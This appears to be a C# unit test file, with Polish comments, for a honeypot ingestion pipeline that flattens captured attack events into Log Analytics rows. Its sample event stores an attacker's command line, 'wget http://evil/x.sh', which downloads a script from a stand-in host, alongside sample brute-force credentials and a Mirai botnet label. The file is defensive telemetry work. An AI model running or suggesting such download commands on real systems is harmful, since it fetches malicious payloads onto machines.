using System.Text.Json;
using HoneyGrid.Contracts;
using HoneyGrid.Ingestion.Sinks;

namespace HoneyGrid.Ingestion.Tests;

/// <summary>
/// Spłaszczanie HoneypotEvent → CowrieRow (kontrakt strumienia DCR / tabela Cowrie_CL):
/// pełne mapowanie pól, przepływ nulli, parytet wartości "drutowych" enumów
/// z HoneyGridJson oraz DOKŁADNE klucze PascalCase w serializacji.
/// </summary>
public sealed class CowrieRowMapperTests
{
    /// <summary>Klucze JSON wymagane przez deklarację strumienia DCR (kontrakt z Bicep).</summary>
    private static readonly string[] ExpectedKeys =
    [
        "TimeGenerated", "AttackerIp", "SensorId", "SensorType", "EventType",
        "SessionId", "Username", "Password", "Command", "HttpMethod", "HttpPath",
        "UserAgent", "CountryCode", "City", "Asn", "AsnOrg", "ThreatScore",
        "KnownMalicious", "Category", "KillChainPhase",
    ];

    /// <summary>Zdarzenie z KOMPLETEM pól opcjonalnych (web + geo + TI + klasyfikacja).</summary>
    private static HoneypotEvent FullEvent() => new()
    {
        Id = Guid.NewGuid(),
        AttackerIp = "198.51.100.23",
        SensorId = "web-eu-01",
        SensorType = SensorType.Web,
        Timestamp = new DateTimeOffset(2026, 6, 11, 8, 15, 30, TimeSpan.Zero),
        EventType = EventType.HttpRequest,
        SessionId = "sess-42",
        Credentials = new CredentialPair { Username = "admin", Password = "P@ssw0rd" },
        Command = "wget http://evil/x.sh",
        Http = new HttpInfo { Method = "POST", Path = "/wp-login.php", UserAgent = "curl/8.0" },
        Geo = new GeoInfo
        {
            Country = "PL",
            City = "Warszawa",
            Asn = "AS5617",
            Org = "Orange Polska",
        },
        ThreatIntel = new ThreatIntelInfo { Score = 87, KnownMalicious = true },
        Classification = new ClassificationInfo
        {
            Category = "mirai_botnet",
            KillChainPhase = KillChainPhase.Delivery,
        },
    };

    [Fact]
    public void FullEvent_MapsEveryField()
    {
        var evt = FullEvent();

        var row = CowrieRowMapper.ToRow(evt);

        Assert.Equal(evt.Timestamp, row.TimeGenerated);
        Assert.Equal("198.51.100.23", row.AttackerIp);
        Assert.Equal("web-eu-01", row.SensorId);
        Assert.Equal("web", row.SensorType);
        Assert.Equal("http.request", row.EventType);
        Assert.Equal("sess-42", row.SessionId);
        Assert.Equal("admin", row.Username);
        Assert.Equal("P@ssw0rd", row.Password);
        Assert.Equal("wget http://evil/x.sh", row.Command);
        Assert.Equal("POST", row.HttpMethod);
        Assert.Equal("/wp-login.php", row.HttpPath);
        Assert.Equal("curl/8.0", row.UserAgent);
        Assert.Equal("PL", row.CountryCode);
        Assert.Equal("Warszawa", row.City);
        Assert.Equal("AS5617", row.Asn);
        Assert.Equal("Orange Polska", row.AsnOrg);
        Assert.Equal(87, row.ThreatScore);
        Assert.True(row.KnownMalicious);
        Assert.Equal("mirai_botnet", row.Category);
        Assert.Equal("delivery", row.KillChainPhase);
    }

    [Fact]
    public void MinimalEvent_NullsFlowThroughWithoutThrowing()
    {
        // Tylko pola wymagane kontraktem — wszystkie obiekty zagnieżdżone null.
        var evt = new HoneypotEvent
        {
            Id = Guid.NewGuid(),
            AttackerIp = "203.0.113.7",
            SensorId = "ssh-eu-01",
            Timestamp = new DateTimeOffset(2026, 6, 11, 12, 0, 0, TimeSpan.Zero),
            EventType = EventType.Connect,
        };

        var row = CowrieRowMapper.ToRow(evt);

        Assert.Equal("connect", row.EventType);
        Assert.Null(row.SensorType);
        Assert.Null(row.SessionId);
        Assert.Null(row.Username);
        Assert.Null(row.Password);
        Assert.Null(row.Command);
        Assert.Null(row.HttpMethod);
        Assert.Null(row.HttpPath);
        Assert.Null(row.UserAgent);
        Assert.Null(row.CountryCode);
        Assert.Null(row.City);
        Assert.Null(row.Asn);
        Assert.Null(row.AsnOrg);
        Assert.Null(row.ThreatScore);
        Assert.Null(row.KnownMalicious);
        Assert.Null(row.Category);
        Assert.Null(row.KillChainPhase);
    }

    // --- Parytet wartości "drutowych" z HoneyGridJson: mapowanie switch w CowrieRowMapper
    //     NIE MOŻE się rozjechać z atrybutami JsonStringEnumMemberName w Contracts.
    //     Serializujemy pojedynczą wartość enuma opcjami HoneyGridJson i zdejmujemy cudzysłowy.

    [Fact]
    public void SensorTypeWireValues_MatchHoneyGridJson_ForEveryValue()
    {
        foreach (var value in Enum.GetValues<SensorType>())
        {
            var expected = JsonSerializer.Serialize(value, HoneyGridJson.Options).Trim('"');
            Assert.Equal(expected, CowrieRowMapper.ToWire(value));
        }
    }

    [Fact]
    public void EventTypeWireValues_MatchHoneyGridJson_ForEveryValue()
    {
        foreach (var value in Enum.GetValues<EventType>())
        {
            var expected = JsonSerializer.Serialize(value, HoneyGridJson.Options).Trim('"');
            Assert.Equal(expected, CowrieRowMapper.ToWire(value));
        }
    }

    [Fact]
    public void KillChainPhaseWireValues_MatchHoneyGridJson_ForEveryValue()
    {
        foreach (var value in Enum.GetValues<KillChainPhase>())
        {
            var expected = JsonSerializer.Serialize(value, HoneyGridJson.Options).Trim('"');
            Assert.Equal(expected, CowrieRowMapper.ToWire(value));
        }
    }

    // --- Serializacja wiersza: klucze JSON muszą być DOKŁADNIE PascalCase
    //     (kontrakt streamDeclaration w DCR — dopasowanie z uwzględnieniem wielkości liter).

    [Fact]
    public void SerializedFullRow_HasExactlyTheDcrStreamKeys()
    {
        var row = CowrieRowMapper.ToRow(FullEvent());

        var json = JsonSerializer.Serialize(row, CowrieRowMapper.SerializerOptions);
        using var doc = JsonDocument.Parse(json);
        var keys = doc.RootElement.EnumerateObject().Select(p => p.Name).ToArray();

        Assert.Equal(ExpectedKeys.OrderBy(k => k), keys.OrderBy(k => k));
    }

    [Fact]
    public void SerializedMinimalRow_KeepsAllKeysWithNulls()
    {
        // Pola null NIE są pomijane (inaczej niż w HoneyGridJson) — kolumny DCR
        // dostają jawne nulle, a zestaw kluczy jest stały niezależnie od zdarzenia.
        var row = CowrieRowMapper.ToRow(new HoneypotEvent
        {
            Id = Guid.NewGuid(),
            AttackerIp = "203.0.113.7",
            SensorId = "ssh-eu-01",
            Timestamp = DateTimeOffset.UtcNow,
            EventType = EventType.LoginFailed,
        });

        var json = JsonSerializer.Serialize(row, CowrieRowMapper.SerializerOptions);
        using var doc = JsonDocument.Parse(json);
        var keys = doc.RootElement.EnumerateObject().Select(p => p.Name).ToArray();

        Assert.Equal(ExpectedKeys.OrderBy(k => k), keys.OrderBy(k => k));
        Assert.Equal(JsonValueKind.Null, doc.RootElement.GetProperty("SensorType").ValueKind);
        Assert.Equal(JsonValueKind.Null, doc.RootElement.GetProperty("KillChainPhase").ValueKind);
    }

    [Fact]
    public void SerializedRow_TimeGeneratedIsIso8601Utc()
    {
        var row = CowrieRowMapper.ToRow(TestHelpers.SampleEvent());

        var json = JsonSerializer.Serialize(row, CowrieRowMapper.SerializerOptions);
        using var doc = JsonDocument.Parse(json);

        // Log Analytics wymaga ISO 8601 dla TimeGenerated — DateTimeOffset daje to z pudełka.
        Assert.Equal("2026-06-11T12:30:00+00:00", doc.RootElement.GetProperty("TimeGenerated").GetString());
    }
}
